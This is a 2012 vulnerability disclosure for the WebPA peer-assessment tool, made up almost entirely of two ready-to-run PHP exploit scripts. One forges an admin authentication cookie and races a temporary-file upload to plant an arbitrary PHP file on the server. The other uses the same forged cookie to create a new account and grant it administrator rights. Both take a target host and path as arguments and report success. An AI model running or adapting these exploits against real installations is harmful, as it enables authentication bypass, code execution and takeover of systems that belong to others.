  :::::::-.   ...    ::::::.    :::.
   ;;,   `';, ;;     ;;;`;;;;,  `;;;
   `[[     [[[['     [[[  [[[[[. '[[
    $$,    $$$$      $$$  $$$ "Y$c$$
    888_,o8P'88    .d888  888    Y88
    MMMMP"`   "YmmMMMM""  MMM     YM

   [ Discovered by dun \ posdub[at]gmail.com ]
   [ 2012-08-23                              ]
 ##################################################
 # [ WebPA <= 1.1.0.1 ] Multiple Vulnerabilities  #
 ##################################################
 #
 # Script: "WebPA is an open source online peer assessment tool that enables
 #          every team member to recognise individual contributions to group work."
 #
 # Vendor:   http://www.webpaproject.com/
 # Download: http://sourceforge.net/projects/webpa/files/webpa/
 # Exploits were tested on:
 # Windows (Apache 2.2.17 + php 5.2.17)
 # Linux Centos (Apache 2.2.3 (CentOS) + php 5.2.17)
 #
 ##################################################
 # [ Arbitrary File Upload ]
 # PoC exploit Code:
 <?php
 error_reporting(0);
 set_time_limit(0);
 ini_set("default_socket_timeout", 5);

 function http_send($host, $port, $headers) {
  $fp = fsockopen($host, $port);
  if (!$fp) die('Connection -> fail');
  fputs($fp, $headers);
  return $fp;
 }

 function http_recv($fp) {
  $ret="";
  while (!feof($fp))
   $ret.= fgets($fp, 1024);
  fclose($fp);
  return $ret;
 }

 print "\n#  WebPA v1.1.0.1 Arbitrary File Upload   #\n";
 print "# Discovered by dun \ posdub[at]gmail.com #\n\n";
 if ($argc < 3) {
  print "Usage:   php $argv[0] <host> <path>\n";
  print "Example: php $argv[0] localhost /WebPA/\n";
  die();
 }

 $host = $argv[1];
 $path = $argv[2];
 $tmp = 'tmp/';
 $temp_prefix='temp_';
 $up_file='phpinfo.php';
 $i=0;
 // preparing cookie for authentication bypass
 $cookie = base64_encode((time()*2).'|'.(time()*2).'|'.serialize(array('user_id'=> '1', 'admin'=> '1')));
 // preparing POST data to perform the maximum delay before deleting temporary php file
 $payload = "-----------------------------187161971819895\r\n";
 $payload .= "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"%s\"\r\n";
 $payload .= "Content-Type: text/plain\r\n\r\n";
 $payload .= "<?php fwrite(fopen('%s','w'),'<?php phpinfo(); ?>'); ?>!".str_repeat("A",40)."\r\n";
 // making max lag, before unlink
 $payload .= str_repeat(str_repeat("A!",1)."!".str_repeat("A!",4)."\r\n",1000)."\r\n"; 
 $payload .= "-----------------------------187161971819895\r\n";
 $payload .= "Content-Disposition: form-data; name=\"rdoFileContentType\"\r\n\r\n";
 $payload .= "2\r\n";
 $payload .= "-----------------------------187161971819895\r\n";
 $payload .= "Content-Disposition: form-data; name=\"rdoFileSeperator\"\r\n\r\n";
 $payload .= "!\r\n";
 $payload .= "-----------------------------187161971819895--\r\n";
 $headers = "POST {$path}{$tmp}readfile.php HTTP/1.1\r\n";
 $headers .= "Host: {$host}\r\n";
 $headers .= "Connection: close\r\n";
 $headers .= "Cookie: AUTH_COOKIE={$cookie}\r\n";
 $headers .= "Content-Type: multipart/form-data; boundary=---------------------------187161971819895\r\n";
 $headers .= "Content-Length: ".strlen($payload)."\r\n\r\n";
 $headers .= sprintf($payload, $temp_prefix.$up_file, $up_file);
 fclose(http_send($host, 80, $headers));
 $headers = "GET {$path}{$tmp}%s HTTP/1.0\r\n";
 $headers .= "Host: {$host}\r\n";
 $headers .= "Connection: close\r\n\r\n";

 while(++$i<1000) {
    $res=http_recv(http_send($host, 80, sprintf($headers, $temp_prefix.$up_file)));
    if(!preg_match('/404 Not Found/',$res)) {
     $res=http_recv(http_send($host, 80, sprintf($headers, $up_file)));
      if(preg_match('/200 OK/',$res))
        print "Success!\n\nUploaded file: http://{$host}{$path}{$tmp}{$up_file}\n";
      break;
    }
 }
 if($i==1000) print "Failed.\n";
 ?>
 #
 ##################################################
 # [ Arbitrary Add Admin ]
 # PoC exploit Code:
 <?php
 error_reporting(0);
 set_time_limit(0);
 ini_set("default_socket_timeout", 5);

 function http_send($host, $port, $headers) {
  $fp = fsockopen($host, $port);
  if (!$fp) die('Connection -> fail');
  fputs($fp, $headers);
  return $fp;
 }

 function http_recv($fp) {
  $ret="";
  while (!feof($fp))
   $ret.= fgets($fp, 1024);
  fclose($fp);
  return $ret;
 }

 print "\n# WebPA v1.1.0.1 Arbitrary Add Admin Exploit #\n";
 print "# Discovered by dun  \  posdub[at]gmail.com  #\n\n";
 if ($argc < 5) {
  print "Usage:   php $argv[0] <host> <path> username password\n";
  print "Example: php $argv[0] localhost /WebPA/ foo bar\n";
  die();
 }

 $host = $argv[1];
 $path = $argv[2];
 $newuser = $argv[3];
 $newpass = $argv[4];
 $cookie = base64_encode((time()*2).'|'.(time()*2).'|'.serialize(array( 'user_id'=> '1', 'admin'=> '1' )));
 print "Adding a new user [ {$newuser} : {$newpass} ]\n";
 $payload = "-----------------------------187161971819895\r\n";
 $payload .= "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"user.csv\"\r\n";
 $payload .= "Content-Type: text/csv\r\n\r\n";
 $payload .= "institutional_reference,forename,lastname,email,username,module_code,department_id,course_id,password\r\n";
 $payload .= "1,2,3,4,{$newuser},6,7,8,{$newpass}\r\n\r\n";
 $payload .= "-----------------------------187161971819895\r\n";
 $payload .= "Content-Disposition: form-data; name=\"rdoFileContentType\"\r\n\r\n";
 $payload .= "2\r\n";
 $payload .= "-----------------------------187161971819895--\r\n";
 $headers = "POST {$path}admin/load/simple.php HTTP/1.1\r\n";
 $headers .= "Host: {$host}\r\n";
 $headers .= "Connection: close\r\n";
 $headers .= "Cookie: AUTH_COOKIE={$cookie}\r\n";
 $headers .= "Content-Type: multipart/form-data; boundary=---------------------------187161971819895\r\n";
 $headers .= "Content-Length: ".strlen($payload)."\r\n\r\n";
 $headers .= ($payload);
 fclose(http_send($host, 80, $headers));
 sleep(2);
 print "Granting admin privileges for user [ {$newuser} ]\n";
 $headers = "GET {$path}admin/review/staff/index.php HTTP/1.0\r\n";
 $headers .= "Host: {$host}\r\n";
 $headers .= "Connection: close\r\n";
 $headers .= "Cookie: AUTH_COOKIE={$cookie}\r\n\r\n";
 preg_match_all('/php\?u=(\d+)/',http_recv(http_send($host, 80, $headers)) , $matches);
 if(!is_numeric(max($matches[1]))) die('Failed.');
 sleep(2);
 $payload = "rdo_type=staff&name=1&surname=2&email=3&password={$newpass}&chk_admin=on&save=".urlencode('Save Changes');
 $headers = "POST {$path}admin/edit/index.php?u=".max($matches[1])." HTTP/1.0\r\n";
 $headers .= "Host: {$host}\r\n";
 $headers .= "Connection: close\r\n";
 $headers .= "Cookie: AUTH_COOKIE={$cookie}\r\n";
 $headers .= "Content-Type: application/x-www-form-urlencoded\r\n";
 $headers .= "Content-Length: ".strlen($payload)."\r\n\r\n";
 $headers .= ($payload);
 fclose(http_send($host, 80, $headers));
 print "Success!\n\n";
 print "http://{$host}{$path}login.php\n";
 print "user: {$newuser}\n";
 print "pass: {$newpass}\n";
 ?>
 #
 ### [ dun / 2012 ] ###############################
